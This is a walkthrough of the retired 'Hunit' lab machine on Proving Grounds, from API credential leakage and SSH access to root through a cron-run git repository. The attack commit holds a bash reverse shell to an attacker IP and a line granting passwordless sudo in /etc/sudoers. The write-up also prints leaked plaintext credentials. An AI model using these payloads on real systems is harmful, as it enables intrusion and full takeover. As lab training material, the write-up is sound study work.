---
machine: Hunit
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [api-credential-leak, anonymous-smb, credential-spraying, git-server-rce, cron-privesc, ssh-key]
date: 2026-09-07
status: retired
summary: A Linux box running a blog-style API and an internal git server — testing unauthenticated API enumeration for leaked user credentials, a null-session SMB share for lateral clues, and a root-owned cron-triggered git repository we can push malicious commits to for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/pg/hunit]
└─$ nmap-full target
[*] Running fast port discovery on target...
[*] Open ports: 8080,12445,18030,43022
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 19:15 -0400
Nmap scan report for target (192.168.208.125)
Host is up (0.061s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat (language: en)
|_http-title: My Haikus
|_http-open-proxy: Proxy might be redirecting requests
12445/tcp open  netbios-ssn Samba smbd 4
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: Whack A Mole!
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.03 seconds
[*] Checking if UDP/SNMP is up on target...
[!] Invalid IP address!
```

We feroxbust port 8080 webapp and find the /article directory. Feroxbusting port 18030 we find nothing significant.

The port 8080 webapp has a list of haikus in the /articles directory that you can find on the main page. This also leaks some names to us:

```text
James
Julie
Ezra Pound
Natsume Soseki
Yosa Buson
Kobayashi Issa
Matsuo Basho
```

If we scan smb with anonymous access we find:

```bash
┌──(kali㉿kali)-[~/pg/hunit]
└─$ nxc smb target -u '' -p '' --port 12445 --shares
SMB         192.168.208.125 12445  HUNIT            [*] Unix - Samba (name:HUNIT) (domain:) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         192.168.208.125 12445  HUNIT            [+] \: 
SMB         192.168.208.125 12445  HUNIT            [*] Enumerated shares
SMB         192.168.208.125 12445  HUNIT            Share           Permissions     Remark
SMB         192.168.208.125 12445  HUNIT            -----           -----------     ------
SMB         192.168.208.125 12445  HUNIT            Commander       READ,WRITE      Dademola Files
SMB         192.168.208.125 12445  HUNIT            IPC$                            IPC Service (Samba 4.13.2)

```

When we feroxbust the port 8080 again, we see a reference to the /api directory and maybe /api/articles:

```bash
┌──(kali㉿kali)-[~/pg/hunit]
└─$ feroxbuster -u http://target:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --thorough -fs 404

[#############>------] - 2m    169020/249275  48s     found:0       errors:0      
[#############>------] - 2m     42482/62282   420/s   http://target:8080/ 
[#############>------] - 2m     42314/62282   421/s   http://target:8080/api/ 
[#############>------] - 2m     42228/62282   421/s   http://target:8080/api/user/ 
[#############>------] - 2m     41859/62282   420/s   http://target:8080/api/article/ 
```

## Foothold

When we try navigating to an endpoint like the `in-a-station-of-the-metro` and find that the API endpoint leaks credentials:

![API JSON response for /api/article/in-a-station-of-the-metro leaking author login jvargas and a password field](/media/Pasted%20image%2020260907191234.png)

```bash
┌──(kali㉿kali)-[~/pg/hunit]
└─$ ssh jvargas@192.168.208.125 -p 43022    
The authenticity of host '[192.168.208.125]:43022 ([192.168.208.125]:43022)' can't be established.
ED25519 key fingerprint is: SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.208.125]:43022' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jvargas@192.168.208.125's password: 
Permission denied, please try again.
jvargas@192.168.208.125's password: 
```

This credential doesn't work for jvargas but we can try working backwards to enumerate other potential creds.

if we go to /api we see other /api endpoints:

![API JSON response for /api listing the /api/, /article/, and /user/ endpoints](/media/Pasted%20image%2020260907191426.png)

If we navigate to /api/user/? we can find all the users and their credentials:

![API JSON response for /api/user/? listing five users including dademola with an Admin description and plaintext-looking password](/media/Pasted%20image%2020260907191509.png)

dademola matches the description of the Commander SMB share we have write access to. If we try to ssh with `dademola:ExplainSlowQuest110` we can gain ssh access to the box:

```bash
┌──(kali㉿kali)-[~/pg/hunit]
└─$ ssh dademola@192.168.208.125 -p 43022
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dademola@192.168.208.125's password: 
Permission denied, please try again.
dademola@192.168.208.125's password: 
[dademola@hunit ~]$ whoami
dademola
```

We can read the local.txt flag from `dademola`'s home directory.

## Privilege Escalation

After some enumeration we run `pspy64` and linpeas.sh find some interesting output:

```bash
2026/09/08 01:27:06 CMD: UID=0     PID=1      | /sbin/init 
2026/09/08 01:28:01 CMD: UID=0     PID=1916   | /usr/bin/crond -n 
2026/09/08 01:28:01 CMD: UID=0     PID=1917   | 
2026/09/08 01:28:01 CMD: UID=0     PID=1918   | /bin/bash /root/pull.sh 
2026/09/08 01:28:01 CMD: UID=0     PID=1919   | /usr/lib/git-core/git fetch --update-head-ok 
2026/09/08 01:28:01 CMD: UID=0     PID=1920   | /bin/sh -c git-upload-pack '/git-server' git-upload-pack '/git-server' 
2026/09/08 01:28:01 CMD: UID=0     PID=1921   | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2026/09/08 01:28:01 CMD: UID=0     PID=1922   | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet --alternate-refs 
2026/09/08 01:28:01 CMD: UID=0     PID=1923   | /usr/lib/git-core/git maintenance run --auto --no-quiet 
```

It seems that root is running some git related commands on a cronjob to a `/git-server` directory. I wasn't familiar with `git-upload-pack` so I looked it up.

```text
`git-upload-pack` is a low-level (plumbing) Git command that runs on a remote server to send repository data back to a client during a `git fetch`, `git pull`, or `git clone` operation
```

This with the `pull.sh` command indicates that root is regularly syncing to a git repo.

If we explore the crontabs we see that root is also running backups.sh from root's `git-server` directory:

```bash
[dademola@hunit ~]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

```bash
2026/09/08 01:32:59 CMD: UID=0     PID=1      | /sbin/init 
2026/09/08 01:33:01 CMD: UID=0     PID=1958   | /usr/bin/crond -n 
2026/09/08 01:33:01 CMD: UID=0     PID=1959   | /bin/sh -c /root/git-server/backups.sh 
```

We also find a private key `id_rsa` for the `git` user in its /home directory:

```bash
[dademola@hunit .ssh]$ ls -lah
total 20K
drwxr-xr-x 2 git  git  4.0K Nov  5  2020 .
drwxr-xr-x 4 git  git  4.0K Nov  5  2020 ..
-rwxr-xr-x 1 root root  564 Nov  5  2020 authorized_keys
-rwxr-xr-x 1 root root 2.6K Nov  5  2020 id_rsa
-rwxr-xr-x 1 root root  564 Nov  5  2020 id_rsa.pub
```

We can actually ssh into the git user with this key after chmod 700ing it, however, it doesn't seem to have access to any binaries making it challenging for us to navigate around as the git user.

We can issue git commands remotely as the git user with its key with the following:

```bash
git clone -c core.sshCommand="ssh -i ~/.ssh/your_specific_private_key" git@github.com:username/repository-name.git
```

```bash
┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc]
└─$ git clone -c core.sshCommand="ssh -i /home/kali/pg/hunit/spring-rce-poc/git.priv -p 43022" git@hunit:/git-server

Cloning into 'git-server'...
The authenticity of host '[hunit]:43022 ([192.168.208.125]:43022)' can't be established.
ED25519 key fingerprint is: SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[hunit]:43022' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

I go ahead and modify `backups.sh` and add my privesc payload to it consisting of a reverse shell and a payload to add my user to `/etc/sudoers`

```bash
┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc]
└─$ cd git-server     

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ ls
backups.sh  NEW_CHANGE  README

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ cat backups.sh  
#!/bin/bash
#
#
# # Placeholder
#

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ mousepad backups.sh 

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ chmod +x backups.sh

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#
/bin/bash -i >& /dev/tcp/192.168.45.177/8080 0>&1
echo -n 'dademola ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

We can then go ahead and commit these changes:

```bash
┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git add -A                                                             
┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git status
On branch master
Your branch is up to date with 'origin/master'.

Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   backups.sh

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git commit -m 'not malicious commit'                                                                            
Author identity unknown

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'kali@kali.(none)')

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git config --global user.email "git@git.com"

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git config --global user.name "git"        

┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git commit -m 'not malicious commit'        
[master 18769af] not malicious commit
 1 file changed, 2 insertions(+)

```

Now we push our local git to the repo:

```bash
┌──(kali㉿kali)-[~/pg/hunit/spring-rce-poc/git-server]
└─$ git -c core.sshCommand="ssh -i /home/kali/pg/hunit/spring-rce-poc/git.priv -p 43022" push git@hunit:/git-server

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 369 bytes | 369.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
To hunit:/git-server
   b50f4e5..18769af  master -> master
```

```bash
┌──(kali㉿kali)-[~/pg/hunit]
└─$ rlwrap -cAr nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.177] from (UNKNOWN) [192.168.208.125] 40338
bash: cannot set terminal process group (2505): Inappropriate ioctl for device
bash: no job control in this shell
[root@hunit ~]# whoami
whoami
root
```

We can retrieve the proof.txt from the /root directory and the box is compromised!
